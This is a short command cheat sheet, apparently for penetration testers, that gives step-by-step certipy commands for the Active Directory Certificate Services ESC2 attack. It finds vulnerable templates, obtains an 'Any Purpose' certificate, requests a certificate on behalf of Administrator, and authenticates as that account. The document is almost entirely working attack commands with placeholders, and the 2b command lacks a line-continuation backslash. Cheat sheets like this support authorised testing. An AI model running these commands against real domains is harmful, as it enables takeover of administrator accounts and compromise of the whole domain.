# ADCS ESC2

% adcs, certificate, ActiveDirectory, template

## 1. Finding vulnerable template
```
certipy find -u <username> -p '<password>' -target <CA_FQDN> -vulnerable -stdout
```

## 2a. Get an “Any Purpose” cert (implicitly an agent)
```
certipy req -u <username> -p '<password>' -target <CA_FQDN> -ca <CA_NAME> \
            -dc-ip <DC_IP> \
            -dc-host <DC_HOST> \
            -template <ESC2_ANYPURPOSE_TEMPLATE>
```

## 2b. Use it to request a cert **on behalf of** Administrator
```
certipy req -u <username> -p '<password>' \
            -dc-ip <DC_IP> -target <CA_FQDN> \
            -dc-host <DC_HOST> -ca <CA_NAME> \
            -pfx <attacker.pfx>
            -template <ESC2_ANYPURPOSE_TEMPLATE> -on-behalf-of '<domain>\\Administrator'
```

## 3. Authenticate
```
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```
